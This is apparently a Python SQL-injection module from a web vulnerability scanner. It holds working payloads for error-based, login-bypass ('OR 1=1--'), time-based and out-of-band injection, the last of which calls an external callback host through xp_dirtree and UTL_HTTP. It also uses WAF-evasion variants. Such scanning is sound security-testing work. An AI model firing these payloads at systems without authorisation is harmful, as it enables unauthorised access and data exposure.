"""
modules/vulns/sqli.py — SQL Injection detection

Three strategies:
  1. Error-based  — inject single-quote, look for DB error strings (GET params + forms)
  2. Auth-bypass  — inject classic OR payload into login forms, detect session redirect
  3. Time-based   — SLEEP/WAITFOR only on forms (to stay inside the 120 s module budget)
"""
import asyncio
import logging
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
from core.evasion import SQLI_ERROR_PAYLOADS, SQLI_BYPASS_PAYLOADS, SQLI_TIME_PAYLOADS, maybe_jitter
import httpx

logger = logging.getLogger(__name__)

ERROR_PATTERNS = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "supplied argument is not a valid mysql",
    # MSSQL
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "incorrect syntax near",
    "syntax error converting",
    "odbc microsoft access",
    "jet database engine",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "pg_num_rows",
    "unterminated quoted string at or near",
    "pgsql error",
    # Oracle
    "ora-01756",
    "ora-00933",
    "ora-00907",
    "oracle error",
    # Generic
    "sqlstate",
    "syntax error or access violation",
    "sql syntax",
    "division by zero",
    "[microsoft][odbc",
    "invalid sql statement",
    "database error",
    "sql command not properly ended",
]

AUTH_BYPASS_PAYLOADS = [
    "' OR '1'='1'--",
    "' OR 1=1--",
    "admin'--",
    "' OR 'x'='x",
]

TIME_PAYLOADS = [
    ("' AND SLEEP(5)-- -", "MySQL"),
    ("'; WAITFOR DELAY '0:0:5'-- -", "MSSQL"),
    ("' AND pg_sleep(5)-- -", "PostgreSQL"),
    ("1 AND SLEEP(5)-- -", "MySQL (numeric)"),
]

SLOW_TIMEOUT = httpx.Timeout(connect=5.0, read=20.0, write=5.0, pool=5.0)

LOGIN_INDICATORS = re.compile(
    r'(uid|user|username|login|email|uname)',
    re.IGNORECASE
)
POST_AUTH_INDICATORS = [
    '/dashboard', '/main', '/account', '/home', '/portal',
    '/myaccount', '/profile', '/bank/', '/admin',
]


class SqlInjection:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        forms = ctx.get("forms", [])
        endpoints = ctx.get("endpoints", [])
        limiter = ctx["limiter"]
        oob = ctx.get("oob")
        sem = asyncio.Semaphore(15)
        seen: set[str] = set()  # dedup by (url, technique)

        verifier = ctx.get("verifier")

        # ── 1. Error-based on GET endpoints ───────────────────────────────────
        async def probe_ep(ep: str):
            parsed = urlparse(ep)
            if not parsed.query:
                return
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:4]:
                key = f"error:{parsed.netloc}{parsed.path}:{param}"
                if key in seen:
                    continue
                seen.add(key)
                f = await self._error_probe_param(ep, param, parsed, params, limiter, sem, verifier)
                if f:
                    findings.append(f)
                    break
                # OOB blind SQLi on this param
                if oob and oob.active:
                    f2 = await self._oob_probe_param(ep, param, parsed, params, limiter, sem, oob)
                    if f2:
                        findings.append(f2)
                        break

        await asyncio.gather(*[probe_ep(ep) for ep in endpoints[:200]])

        # ── 2. Error-based + auth-bypass + time-based on forms ────────────────
        async def probe_form(form: dict):
            key = f"form:{form.get('action','')}"
            if key in seen:
                return
            seen.add(key)
            fs = await self._test_form(form, limiter, sem)
            findings.extend(fs)

        await asyncio.gather(*[probe_form(f) for f in forms[:40]])

        logger.info(f"SqlInjection completed — {len(findings)} finding(s)")
        return findings

    # ── Error-based GET param ──────────────────────────────────────────────────
    async def _error_probe_param(self, url, param, parsed, params, limiter, sem, verifier=None) -> Finding | None:
        async with sem:
            # Try multiple encoded variants — bypass WAF signature rules
            for error_payload in SQLI_ERROR_PAYLOADS:
                probe_params = dict(params)
                probe_params[param] = [error_payload]
                probe_url = parsed._replace(query=urlencode(probe_params, doseq=True)).geturl()
                try:
                    await maybe_jitter()
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            r = await c.get(probe_url)
                    body_low = r.text.lower()
                    if not any(p in body_low for p in ERROR_PATTERNS):
                        continue  # this encoding didn't trigger — try next
                    probe_url_final = probe_url
                    finding = Finding(
                        title=f"SQL Injection (Error-Based) in GET '{param}'",
                        severity="Critical",
                        description=f"Parameter '{param}' reflects a DB error when injected with '{error_payload}'.",
                        affected_url=probe_url_final,
                        proof=f"GET {probe_url_final}\nPayload: {error_payload}\nHTTP {r.status_code}\n{r.text[:600]}",
                        remediation="Use parameterised queries / prepared statements.",
                        impact=5, likelihood=5, module="SqlInjection",
                        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                    )
                    # ── Playwright screenshot of the DB error ─────────────────
                    if verifier and verifier.available:
                        confirmed, shot = await verifier.verify_sqli(probe_url_final)
                        if confirmed:
                            finding.verified   = True
                            finding.screenshot = shot
                            finding.title      = f"SQL Injection (Error-Based) in GET '{param}' [VERIFIED]"
                            finding.proof     += "\n\nPlaywright screenshot: DB error message captured in headless Chromium."
                    return finding
                except Exception as e:
                    logger.debug(f"SQLi error-probe {probe_url}: {type(e).__name__}: {e}")
        return None

    # ── Form: error-based + auth-bypass + time-based ──────────────────────────
    async def _test_form(self, form: dict, limiter, sem) -> list[Finding]:
        results: list[Finding] = []
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        if not action or not inputs:
            return results

        is_login = any(LOGIN_INDICATORS.match(i) for i in inputs)

        async with sem:
            # ── Error-based ────────────────────────────────────────────────────
            for inp in inputs[:4]:
                data = {i: "test" for i in inputs}
                data[inp] = "'"
                try:
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            r = await (c.post(action, data=data) if method == "POST"
                                       else c.get(action, params=data))
                    if any(p in r.text.lower() for p in ERROR_PATTERNS):
                        results.append(Finding(
                            title=f"SQL Injection (Error-Based) in Form '{inp}'",
                            severity="Critical",
                            description=f"Form field '{inp}' at {action} triggers a DB error on single-quote injection.",
                            affected_url=action,
                            proof=f"{method} {action}\nField: {inp}='\nHTTP {r.status_code}\n{r.text[:500]}",
                            remediation="Use parameterised queries / prepared statements.",
                            impact=5, likelihood=5, module="SqlInjection",
                            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                        ))
                        break
                except Exception as e:
                    logger.debug(f"SQLi form error-probe {action} [{inp}]: {type(e).__name__}: {e}")

            # ── Auth bypass (login forms) ──────────────────────────────────────
            if is_login and not results:
                user_field = next(
                    (i for i in inputs if LOGIN_INDICATORS.match(i)), inputs[0]
                )
                pass_fields = [i for i in inputs if "pass" in i.lower() or "pwd" in i.lower()]
                pass_field = pass_fields[0] if pass_fields else (inputs[1] if len(inputs) > 1 else None)

                for bypass in AUTH_BYPASS_PAYLOADS:
                    data = {i: "test" for i in inputs}
                    data[user_field] = bypass
                    if pass_field:
                        data[pass_field] = "wrongpassword"
                    try:
                        async with limiter.acquire():
                            async with make_client(timeout=PROBE_TIMEOUT, follow_redirects=True) as c:
                                r = await (c.post(action, data=data) if method == "POST"
                                           else c.get(action, params=data))
                        final_url = str(r.url)
                        auth_bypassed = any(ind in final_url.lower() for ind in POST_AUTH_INDICATORS)
                        # Also check for welcome/account language in body
                        if not auth_bypassed:
                            body_low = r.text.lower()
                            auth_bypassed = (
                                "logout" in body_low and "login" not in body_low[:200]
                            ) or any(ind.strip("/") in body_low[:500] for ind in POST_AUTH_INDICATORS)
                        if auth_bypassed:
                            results.append(Finding(
                                title=f"SQL Injection — Authentication Bypass via '{user_field}'",
                                severity="Critical",
                                description=(
                                    f"Login form at {action} is vulnerable to authentication bypass. "
                                    f"Payload '{bypass}' in field '{user_field}' resulted in a "
                                    f"successful login redirect to {final_url}."
                                ),
                                affected_url=action,
                                proof=f"{method} {action}\n{user_field}={bypass}\nFinal URL: {final_url}\nHTTP {r.status_code}",
                                remediation="Use parameterised queries. Never concatenate user input into SQL strings.",
                                impact=5, likelihood=5, module="SqlInjection",
                                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                            ))
                            break
                    except Exception as e:
                        logger.debug(f"SQLi auth-bypass {action}: {type(e).__name__}: {e}")

            # ── Time-based blind (forms only — bounded scope) ──────────────────
            if not results:
                for inp in inputs[:2]:
                    for payload, db in TIME_PAYLOADS[:2]:  # MySQL + MSSQL only
                        data = {i: "test" for i in inputs}
                        data[inp] = payload
                        try:
                            start = time.monotonic()
                            async with limiter.acquire():
                                async with make_client(timeout=SLOW_TIMEOUT) as c:
                                    await (c.post(action, data=data) if method == "POST"
                                           else c.get(action, params=data))
                            elapsed = time.monotonic() - start
                            if 4.5 <= elapsed < 18:
                                results.append(Finding(
                                    title=f"SQL Injection (Time-Based Blind) in Form '{inp}' [{db}]",
                                    severity="Critical",
                                    description=f"Form field '{inp}' caused a {elapsed:.1f}s delay — blind SQLi ({db}).",
                                    affected_url=action,
                                    proof=f"{method} {action}\nField: {inp}={payload}\nDelay: {elapsed:.2f}s",
                                    remediation="Use parameterised queries / prepared statements.",
                                    impact=5, likelihood=5, module="SqlInjection",
                                ))
                                return results
                        except Exception as e:
                            logger.debug(f"SQLi time-probe {action} [{inp}]: {type(e).__name__}: {e}")

        return results

    # ── OOB blind SQLi ────────────────────────────────────────────────────────
    async def _oob_probe_param(self, url, param, parsed, params, limiter, sem, oob) -> Finding | None:
        """Inject DNS/HTTP OOB payloads for blind SQLi detection."""
        async with sem:
            token, cb_url = oob.register(f"sqli_{param}")
            from urllib.parse import urlparse as _up
            host = _up(cb_url).netloc or cb_url.replace("http://", "").split("/")[0]

            # MSSQL: xp_dirtree DNS lookup; MySQL: LOAD_FILE UNC path
            payloads = [
                f"'; EXEC master..xp_dirtree '\\\\{host}\\x'--",
                f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LOAD_FILE('\\\\{host}\\x'))))--",
                f"'; SELECT UTL_HTTP.REQUEST('http://{host}/') FROM dual--",  # Oracle
            ]
            for payload in payloads:
                p = dict(params)
                p[param] = [payload]
                probe_url = parsed._replace(query=urlencode(p, doseq=True)).geturl()
                try:
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            await c.get(probe_url)
                except Exception:
                    pass

            if await oob.wait_for(token, timeout=7.0):
                return Finding(
                    title=f"Blind SQL Injection via '{param}' (OOB Confirmed)",
                    severity="Critical",
                    description=(
                        f"Parameter '{param}' is vulnerable to blind SQL injection. "
                        f"An OOB DNS/HTTP callback was received after injecting "
                        f"xp_dirtree / LOAD_FILE payloads, confirming exploitation."
                    ),
                    affected_url=url,
                    proof=f"GET {url}\nParam: {param}\nOOB callback received → Blind SQLi confirmed",
                    remediation="Use parameterised queries / prepared statements.",
                    impact=5, likelihood=5, module="SqlInjection",
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                )
        return None
